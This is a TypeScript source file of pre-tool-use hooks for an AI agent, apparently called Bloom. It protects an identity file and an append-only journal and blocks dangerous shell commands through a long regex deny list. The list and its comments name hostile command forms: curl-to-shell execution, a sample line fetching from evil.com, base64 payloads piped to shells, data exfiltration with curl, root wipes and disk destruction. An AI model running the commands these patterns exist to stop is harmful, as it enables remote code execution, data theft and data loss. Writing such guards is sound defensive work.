import type { HookCallback } from "@anthropic-ai/claude-agent-sdk";

export interface ParsedHookInput {
  toolName: string;
  filePath: string;
  command: string;
}

export function denyResult(reason: string) {
  return {
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "deny",
      permissionDecisionReason: reason,
    },
  };
}

export function parseHookInput(input: unknown): ParsedHookInput {
  const record =
    typeof input === "object" && input !== null
      ? (input as Record<string, unknown>)
      : ({} as Record<string, unknown>);
  const rawToolInput = record.tool_input;
  const toolInput =
    typeof rawToolInput === "object" && rawToolInput !== null
      ? (rawToolInput as Record<string, unknown>)
      : undefined;
  return {
    toolName: String(record.tool_name ?? ""),
    filePath: String(toolInput?.file_path ?? ""),
    command: String(toolInput?.command ?? ""),
  };
}

export const protectIdentity: HookCallback = async (input) => {
  const { filePath } = parseHookInput(input);

  if (filePath.includes("IDENTITY.md")) {
    return denyResult("IDENTITY.md is the immutable constitution and cannot be modified.");
  }
  return {};
};

export const protectJournal: HookCallback = async (input) => {
  const { filePath } = parseHookInput(input);

  if (filePath.includes("JOURNAL.md")) {
    return denyResult("JOURNAL.md is append-only. Journal entries are managed by the orchestrator via SQLite.");
  }
  return {};
};

export function isDangerousRm(command: string): boolean {
  // Match `rm` followed by flags that include both -r (or --recursive) and -f (or --force)
  // targeting /, ~, . (current dir), or critical system dirs.
  // Handles: rm -rf /, rm -r -f /, rm -f -r /, rm -fr /, rm --recursive --force /, rm -rf ., etc.
  const rmMatch = command.match(/\brm\s+(.*)/);
  if (!rmMatch) return false;
  const rest = rmMatch[1];

  // Block --no-preserve-root unconditionally — it has no legitimate use in Bloom
  if (/--no-preserve-root/.test(rest)) return true;

  const hasRecursive = /(?:^|\s)--recursive(?:\s|$)/.test(rest) || /(?:^|\s)-\w*r/.test(rest);
  const hasForce = /(?:^|\s)--force(?:\s|$)/.test(rest) || /(?:^|\s)-\w*f/.test(rest);
  // Block root (/), home (~), bare current directory (. or ./), and parent directory (.. or ../) —
  // all wipe entire trees. Intentionally allows specific subdirectory paths like ./dist or ./build.
  const hasRootPath   = /(?:^|\s)\/(?:\s|$|\*)/.test(rest);
  const hasHomePath   = /(?:^|\s)~\/?(?:\s|$|\*)/.test(rest);
  const hasCurrentDir = /(?:^|\s)\.(?:\/)?(?:\s|$)/.test(rest);
  const hasParentDir  = /(?:^|\s)\.\.(?:\/)?(?:\s|$)/.test(rest);
  const hasDangerousPath = hasRootPath || hasHomePath || hasCurrentDir || hasParentDir;

  // Critical system directories — no legitimate use in Bloom's context
  const CRITICAL_DIRS = /(?:^|\s)\/(?:etc|usr|var|boot|bin|sbin|lib|proc|sys)(?:\/?\s|\/?\*|\/?\||\/?;|\/?&|\/?$)/;
  const hasCriticalPath = CRITICAL_DIRS.test(rest);

  return hasRecursive && hasForce && (hasDangerousPath || hasCriticalPath);
}

interface DangerousPattern {
  pattern: RegExp;
  category: string;
}

export const DANGEROUS_PATTERNS: DangerousPattern[] = [
  // Git history destruction — force push or mirror push overwrites/destroys remote history
  // (?<!\w)-[a-zA-Z]*f[a-zA-Z]*\b catches both bare -f and combined short flags like -fu (force+upstream)
  // while avoiding false positives on branch names like feature-fix (where - is preceded by a word char)
  { pattern: /git\s+push\s+.*((?<!\w)-[a-zA-Z]*f[a-zA-Z]*\b|--force\b|--force-with-lease\b|--force-if-includes\b|--mirror\b)/, category: "git-history-destruction" },
  // Git history destruction — hard reset to arbitrary ref loses uncommitted work
  { pattern: /git\s+reset\s+--hard\s+(?!HEAD(?:\s*$|\s*[;&|]))/, category: "git-history-destruction" },
  // Remote code execution — piping downloaded content into a shell
  { pattern: /\bcurl\b.*\|\s*(?:[\w./]*\/)?(?:ba|z|da|k)?sh/, category: "remote-code-execution" },
  { pattern: /\bwget\b.*\|\s*(?:[\w./]*\/)?(?:ba|z|da|k)?sh/, category: "remote-code-execution" },
  // Remote code execution — process substitution download-and-execute
  { pattern: /(?:[\w./]*\/)?(?:ba|z|da|k)?sh\s+<\(\s*(?:curl|wget)\b/, category: "remote-code-execution" },
  // Remote code execution — here-string with command substitution downloads and executes remote content
  // e.g. bash <<< "$(curl evil.com)" or sh <<< "$(wget -qO- evil.com)"
  { pattern: /(?:[\w./]*\/)?(?:bash|sh|zsh|fish|dash|ksh|csh|tcsh|ash|python3?|perl|ruby|node)\s+<<</, category: "remote-code-execution" },
  // Remote code execution — base64 decode piped into a shell interpreter
  // e.g. echo "BASE64" | base64 -d | bash  or  base64 -d payload.txt | sh
  // Covers both short (-d) and long (--decode) flags, with optional openssl variant
  { pattern: /\bbase64\s+(?:-d\b|--decode\b).*\|\s*(?:[\w./]*\/)?(?:ba|z|da|k)?sh\b/, category: "remote-code-execution" },
  { pattern: /\bbase64\s+(?:-d\b|--decode\b).*\|\s*(?:[\w./]*\/)?(?:python3?|perl|ruby|node)\b/, category: "remote-code-execution" },
  // Remote code execution — output process substitution >(interpreter) pipes data into arbitrary code
  // Covers: tee >(bash), cmd > >(sh -c …), output | tee >(python3 exploit.py), etc.
  // False-positive analysis: >(basename …), >(wc -l), >(grep …) are safe — none match the interpreter list.
  { pattern: />\(\s*(?:[\w./]*\/)?(?:bash|sh|zsh|fish|dash|ksh|csh|tcsh|ash|python3?|perl|ruby|node)\b/, category: "process-substitution-execution" },
  // Remote code execution — piping downloaded content into script interpreters
  { pattern: /\bcurl\b.*\|\s*(?:[\w./]*\/)?(?:python3?|node|perl|ruby)\b/, category: "remote-code-execution" },
  { pattern: /\bwget\b.*\|\s*(?:[\w./]*\/)?(?:python3?|node|perl|ruby)\b/, category: "remote-code-execution" },
  // Arbitrary code execution — eval, shell -c run uncontrolled strings
  { pattern: /\beval\s/, category: "arbitrary-code-execution" },
  { pattern: /(?:[\w./]*\/)?(?:ba|z|da|k)?sh\s+-c\b/, category: "arbitrary-code-execution" },
  // Fish shell -c — executes arbitrary code identically to sh -c but was previously unmatched
  { pattern: /\bfish\s+-c\b/, category: "arbitrary-code-execution" },
  // Inline interpreter code execution — functionally equivalent to sh -c
  { pattern: /\b(?:python3?|python3\.\d+)\s+-c\b/, category: "inline-code-execution" },
  { pattern: /\bnode\s+(?:-e|--eval)\b/, category: "inline-code-execution" },
  { pattern: /\bperl\s+(?:-e|-E)\b/, category: "inline-code-execution" },
  { pattern: /\bruby\s+-e\b/, category: "inline-code-execution" },
  // Shell script execution — source and dot-script (`. `) execute arbitrary files
  { pattern: /(?:^|[;&|]\s*)source\s/, category: "shell-script-execution" },
  { pattern: /(?:^|[;&|]\s*)\.\s+\S/, category: "shell-script-execution" },
  // Untrusted package execution — npx/npm exec/pnpm exec/pnpm dlx/yarn dlx/bunx run arbitrary packages
  { pattern: /\bnpx\s/, category: "untrusted-package-execution" },
  { pattern: /\bnpm\s+exec\b/, category: "untrusted-package-execution" },
  { pattern: /\bpnpm\s+exec\b/, category: "untrusted-package-execution" },
  { pattern: /\bpnpm\s+dlx\s/, category: "untrusted-package-execution" },
  { pattern: /\byarn\s+dlx\s/, category: "untrusted-package-execution" },
  // bunx / bun x — Bun's equivalent of npx; executes packages without permanent installation
  { pattern: /\bbunx\s/, category: "untrusted-package-execution" },
  { pattern: /\bbun\s+x\s/, category: "untrusted-package-execution" },
  // Git ref destruction — force-delete branches, delete reflog, prune objects, delete tags, delete remote refs
  { pattern: /git\s+branch\s+(-D|--delete\s+--force)\b/, category: "git-ref-destruction" },
  { pattern: /git\s+push\s+(?:.*\s)?(?:-d\b|--delete\b)/, category: "git-ref-destruction" },
  // Git ref destruction — colon-prefix refspec (:<ref>) signals "delete remote ref" without --delete flag
  { pattern: /git\s+push\s+(?:.*\s)?:\S+/, category: "git-ref-destruction" },
  { pattern: /git\s+reflog\s+delete\b/, category: "git-ref-destruction" },
  { pattern: /git\s+reflog\s+expire\b/, category: "git-ref-destruction" },
  { pattern: /git\s+gc\s+.*--prune=(now|all)\b/, category: "git-ref-destruction" },
  { pattern: /git\s+tag\s+(?:-d|--delete)\b/, category: "git-ref-destruction" },
  // Git ref destruction — switch -C force-creates or resets an existing branch to HEAD (ref destruction)
  { pattern: /git\s+switch\s+(?:.*\s)?-C\b/, category: "git-ref-destruction" },
  // Git internals tampering — rm targeting the .git directory destroys all history, refs,
  // and config with no recovery path. Matches: rm .git, rm -rf .git, rm -rf .git/, rm -rf .git/*
  // The end-of-argument anchor requires whitespace, space/tab after /*, or end-of-string to avoid
  // false positives when ".git/*" appears inside commit messages (e.g. rm -rf .git/*,\n more text).
  { pattern: /\brm\s+(?:.*\s)?\.git(?:\/?\s|\/\*(?:[ \t]|$)|\/?$)/, category: "git-internals-tampering" },
  // Git internals tampering — changing permissions/ownership of .git/ or bare .git dir
  { pattern: /\bchmod\s+.*\.git(?:\/|\s|$|;|&|\|)/, category: "git-internals-tampering" },
  { pattern: /\bchown\s+.*\.git(?:\/|\s|$|;|&|\|)/, category: "git-internals-tampering" },
  // Disk/partition destruction — writing to raw devices or reformatting
  { pattern: /\bdd\s+.*of=\/dev\//, category: "disk-destruction" },
  { pattern: /\bmkfs\b/, category: "disk-destruction" },
  { pattern: /\bwipefs\b/, category: "disk-destruction" },
  { pattern: /\bfdisk\b/, category: "disk-destruction" },
  { pattern: /\bparted\b/, category: "disk-destruction" },
  // Git working tree destruction — force-clean untracked files; force-remove linked worktrees with uncommitted changes
  { pattern: /git\s+clean\s+.*(-f|--force)/, category: "git-working-tree-destruction" },
  // (?<!\w)-[a-zA-Z]*f[a-zA-Z]*\b catches both bare -f and combined short flags like -fd (force+delete)
  { pattern: /git\s+worktree\s+remove\s+(?:.*\s)?((?<!\w)-[a-zA-Z]*f[a-zA-Z]*\b|--force\b)/, category: "git-working-tree-destruction" },
  // Git working tree destruction — broad discard of tracked changes (. or .. wipes entire tree or parent)
  { pattern: /git\s+checkout\s+(?:.*\s)?--\s+\.\.?(?:\/)?(?:\s|$)/, category: "git-working-tree-destruction" },
  { pattern: /git\s+restore\s+(?:.*\s)?\.\.?(?:\/)?(?:\s|$)/, category: "git-working-tree-destruction" },
  // Git working tree destruction — switch --discard-changes silently drops all local working-tree changes
  { pattern: /git\s+switch\s+(?:.*\s)?--discard-changes\b/, category: "git-working-tree-destruction" },
  // Git working tree destruction — switch -f/--force also silently discards local working-tree changes
  // (?<!\w)-[a-zA-Z]*f[a-zA-Z]*\b catches both bare -f and combined short flags like -fc (force+create)
  { pattern: /git\s+switch\s+(?:.*\s)?(?:(?<!\w)-[a-zA-Z]*f[a-zA-Z]*\b|--force\b)/, category: "git-working-tree-destruction" },
  // Git history rewriting — filter-branch and filter-repo both rewrite/remove files from history
  { pattern: /git\s+filter-branch\b/, category: "git-history-rewriting" },
  { pattern: /git\s+filter-repo\b/, category: "git-history-rewriting" },
  // Git history rewriting — interactive rebase can drop, squash, edit, and reorder commits
  { pattern: /git\s+rebase\s+(?:.*\s)?(?:-i|--interactive)\b/, category: "git-history-rewriting" },
  // Git history rewriting — amend rewrites the most recent commit in place
  { pattern: /git\s+commit\s+(?:.*\s)?--amend\b/, category: "git-history-rewriting" },
  // Data exfiltration — curl/wget sending data to external servers
  { pattern: /\bcurl\s+.*(-d\b|--data\b|--data-binary\b|--data-raw\b|--data-urlencode\b|--upload-file\b|-F\b|--form\b|--json\b)/, category: "data-exfiltration" },
  { pattern: /\bwget\s+.*--post-(data|file)\b/, category: "data-exfiltration" },
  // xargs command execution bypass — xargs can invoke dangerous commands from stdin
  { pattern: /\bxargs\s+.*(?:[\w./]*\/)?(?:ba|z|da|k)?sh\b/, category: "xargs-command-execution" },
  // xargs with scripting interpreters — parallel to find -exec interpreter block (cycle 244)
  { pattern: /\bxargs\s+.*(?:[\w./]*\/)?(?:python3?|perl|ruby|node)\b/, category: "xargs-command-execution" },
  { pattern: /\bxargs\s+.*\brm\s/, category: "xargs-command-execution" },
  // xargs chmod/chown bypass — evades direct .git pattern by placing .git before the command
  { pattern: /\bxargs\s+.*\bchmod\b/, category: "xargs-command-execution" },
  { pattern: /\bxargs\s+.*\bchown\b/, category: "xargs-command-execution" },
  // Bare file-truncation — silently zeroes or shrinks any file (e.g. truncate -s 0 src/foo.ts)
  // without requiring rm or xargs, bypassing all other path-based guards.
  { pattern: /\btruncate\b/, category: "file-truncation" },
  // Bare file-deletion — unlink deletes a file directly (e.g. unlink src/foo.ts) without
  // requiring xargs, bypassing the xargs-command-execution guard already in place.
  { pattern: /\bunlink\b/, category: "file-deletion" },
  // xargs with file-destroying commands — can wipe all matched files when fed paths from find
  { pattern: /\bxargs\s+.*\bdd\b/, category: "xargs-command-execution" },
  { pattern: /\bxargs\s+.*\btruncate\b/, category: "xargs-command-execution" },
  { pattern: /\bxargs\s+.*\bunlink\b/, category: "xargs-command-execution" },
  { pattern: /\bxargs\s+.*\bmv\b/, category: "xargs-command-execution" },
  // xargs cp — can bulk-overwrite protected targets (e.g. find /tmp | xargs cp IDENTITY.md)
  { pattern: /\bxargs\s+.*\bcp\b/, category: "xargs-command-execution" },
  // xargs tee — overwrites target files when fed paths from find (same risk as xargs cp)
  { pattern: /\bxargs\s+.*\btee\b/, category: "xargs-command-execution" },
  // Git stash destruction — clear destroys all stashes; drop destroys a named stash entry
  { pattern: /git\s+stash\s+clear\b/, category: "git-stash-destruction" },
  { pattern: /git\s+stash\s+drop\b/, category: "git-stash-destruction" },
  // install(1) — Unix install utility copies files and sets arbitrary permissions with -m
  { pattern: /\binstall\s+(?:.*\s)?-[a-zA-Z]*m\b/, category: "file-permission-tampering" },
  // awk with system() call — executes arbitrary shell commands from within awk
  { pattern: /\bawk\b.*\bsystem\s*\(/, category: "awk-code-execution" },
  // awk piping to a shell — awk '{print | "bash"}' executes arbitrary commands
  { pattern: /\bawk\b.*\|\s*["']?(?:ba|z|da|k)?sh\b/, category: "awk-code-execution" },
  // find -exec/-execdir with shell interpreters — executes arbitrary code without xargs
  {
    pattern: /\bfind\b.*-exec(?:dir)?\s+(?:sh|bash|zsh|fish|dash|ksh|csh|tcsh|ash|awk|perl|python3?|ruby|node)\b/,
    category: "find-exec-shell",
  },
  // find -exec/-execdir with destructive file commands — bypasses xargs guards
  {
    pattern: /\bfind\b.*-exec(?:dir)?\s+(?:rm|unlink|chmod|chown|mv|cp|dd|truncate|tee)\b/,
    category: "find-exec-destructive",
  },
  // Untrusted package installation — adding deps pulls arbitrary code
  { pattern: /\bpnpm\s+add\b/, category: "untrusted-package-installation" },
  { pattern: /\bpnpm\s+(?:install|i)\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
  { pattern: /\bnpm\s+(?:install|i)\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
  { pattern: /\byarn\s+add\b/, category: "untrusted-package-installation" },
  // bun add — Bun's package installation command, equivalent to yarn add
  { pattern: /\bbun\s+add\b/, category: "untrusted-package-installation" },
];

/**
 * Escape a string for safe interpolation into a `new RegExp(...)`.
 * Replaces every regex-special character with its backslash-escaped form.
 */
export function escapeRegex(s: string): string {
  return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

/**
 * Build an array of RegExp patterns that detect dangerous shell commands
 * targeting a specific protected file.
 *
 * @param filename - A plain filename string (e.g., `"JOURNAL.md"`).
 *   The function escapes regex-special characters automatically.
 * @param opts.allowAppend - If true, permits append operations (`>>` and `tee -a`)
 *   while still blocking overwrites. Used for JOURNAL.md which is append-only.
 * @returns Array of RegExp patterns covering redirects, cp, mv, sed -i, truncate,
 *   dd, chmod, chown, rm, unlink, ln, git checkout --, and git restore.
 *
 * @example
 * ```ts
 * const patterns = buildProtectedFilePatterns("JOURNAL.md", { allowAppend: true });
 * ```
 */
export function buildProtectedFilePatterns(filename: string, opts?: { allowAppend?: boolean }): RegExp[] {
  const escaped = escapeRegex(filename);
  const patterns: RegExp[] = [
    // Redirect: for append-allowed files, only block overwrite (>); otherwise block both (> and >>)
    opts?.allowAppend
      ? new RegExp(`(?:^|[^>])>\\s*(?:\\S*\\/)?${escaped}`)
      : new RegExp(`(?:>|>>)\\s*(?:\\S*\\/)?${escaped}`),
    // tee: for append-allowed files, allow tee -a / tee --append; otherwise block all tee
    opts?.allowAppend
      ? new RegExp(`\\btee\\s+(?!.*(?:-\\w*a\\b|--append\\b))(?:.*\\s)?(?:\\S*\\/)?${escaped}`)
      : new RegExp(`\\btee\\s+(?:.*\\s)?(?:\\S*\\/)?${escaped}`),
    new RegExp(`\\bcp\\s+(?:.*\\s)?(?:\\S*\\/)?${escaped}(?:\\s|$|;|&|\\|)`),
    new RegExp(`\\bmv\\s+(?:.*\\s)?(?:\\S*\\/)?${escaped}(?:\\s|$|;|&|\\|)`),
    new RegExp(`\\bsed\\s+(?:-i\\b|--in-place\\b|--in-place=\\S+).*${escaped}`),
    // perl -i (in-place edit) — `perl -pi -e 's/...' file` modifies files in place;
    // lookaheads verify both the -i flag and the protected filename are present.
    new RegExp(`\\bperl\\b(?=.*-[a-zA-Z]*i\\b)(?=.*(?:\\S*/)?${escaped})`),
    new RegExp(`\\btruncate\\s+.*${escaped}`),
    new RegExp(`\\bdd\\s+.*of=(?:\\S*\\/)?${escaped}`),
    new RegExp(`\\bchmod\\s+.*${escaped}`),
    new RegExp(`\\bchown\\s+.*${escaped}`),
    new RegExp(`\\brm\\s+.*${escaped}`),
    new RegExp(`\\bunlink\\s+.*${escaped}`),
    new RegExp(`(?:^|[;&|]\\s*|\\s)ln\\s+.*${escaped}`),
    new RegExp(`git\\s+checkout\\s+.*--\\s+.*${escaped}`),
    new RegExp(`git\\s+restore\\s+.*${escaped}`),
  ];
  return patterns;
}

const IDENTITY_MODIFY_PATTERNS = buildProtectedFilePatterns("IDENTITY.md");
const JOURNAL_MODIFY_PATTERNS = buildProtectedFilePatterns("JOURNAL.md", { allowAppend: true });

export function isDangerousCommand(command: string): string | null {
  for (const { pattern, category } of DANGEROUS_PATTERNS) {
    if (pattern.test(command)) {
      return category;
    }
  }
  return null;
}

export const blockDangerousCommands: HookCallback = async (input) => {
  const { toolName, command } = parseHookInput(input);
  if (toolName !== "Bash") return {};

  if (isDangerousRm(command)) {
    return denyResult(`Blocked dangerous command: ${command}`);
  }

  const category = isDangerousCommand(command);
  if (category) {
    return denyResult(`Blocked [${category}]: pattern matched in command`);
  }

  for (const pattern of IDENTITY_MODIFY_PATTERNS) {
    if (pattern.test(command)) {
      return denyResult("IDENTITY.md is the immutable constitution and cannot be modified via Bash.");
    }
  }

  for (const pattern of JOURNAL_MODIFY_PATTERNS) {
    if (pattern.test(command)) {
      return denyResult("JOURNAL.md is append-only and cannot be overwritten or deleted via Bash.");
    }
  }

  return {};
};
